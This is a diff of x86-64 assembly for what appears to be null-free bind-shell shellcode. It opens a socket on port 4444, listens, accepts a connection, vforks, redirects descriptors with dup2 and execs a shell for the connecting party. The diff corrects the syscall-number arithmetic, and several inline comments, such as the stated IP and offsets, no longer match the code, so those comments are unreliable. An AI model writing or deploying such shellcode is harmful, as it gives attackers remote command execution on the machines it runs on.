@@ -32,8 +32,8 @@ start:
 	mov r12, rax									; Save the socket
 
 ;Sock_addr
-	mov r13, 0xFFFFFFFF5C110101		; IP = FFFFFFFF, Port = 5C11(4444)
-	;mov r13, 0x0345450A5C110101 	; IP = FFFFFFFF, Port = 5C11(4444)
+	;mov r13, 0xFFFFFFFF5C110101		; IP = FFFFFFFF, Port = 5C11(4444)
+	mov r13, 0x0345450A5C110101 	; IP = FFFFFFFF, Port = 5C11(4444)
 	mov r9b, 0xFF									; The sock_addr_in is + FF from where we need it
 	sub r13, r9										; So we sub 0xFF from it to get the correct value and avoid a null
 	push r13											; Push it on the stack
@@ -57,16 +57,17 @@ start:
 	syscall												; call listen(fd, 5)
 
 ;accept
-	sub r8, 0x73									; Subtract 73 from r8 = 30
+	sub r8, 0x49									; Subtract 73 from r8 = 30
 	mov rax, r8										; Move 30 into rax
 	mov rdi, r12									; Move the socket fd into rdi
 	xor rsi, rsi									; Zero out rsi
 	xor rdx, rdx									; Zero out rdx
 	syscall												; call accept(fd, 0, 0)
 
-	add r8, 0x29									; Add 29 to r8 = 59
+	add r8, 0x1D									; Add 29 to r8 = 59
 
 ;exec
+	mov rax, r8
 	xor rdx, rdx									; zero out 3rd arg
 	xor rsi, rsi									; zero out 2nd arg
 	xor rdi, rdi									; zero out 1st arg
@@ -76,11 +77,11 @@ start:
 	je exec												; jmp if = 0
 
 ;vfork
-	sub r8, 0x17									; subtract 17 from r8 = 42	
+	sub r8, 0x11									; subtract 17 from r8 = 42	
 	mov rax, r8										; Move 42 into rax
 	syscall												; call vfork();
 
-	add r8, 0x48									; Add 48 to r8 = 90
+	add r8, 0x30									; Add 48 to r8 = 90
 
 dup:
 	mov rax, r8										; move the syscall for dup2 into rax
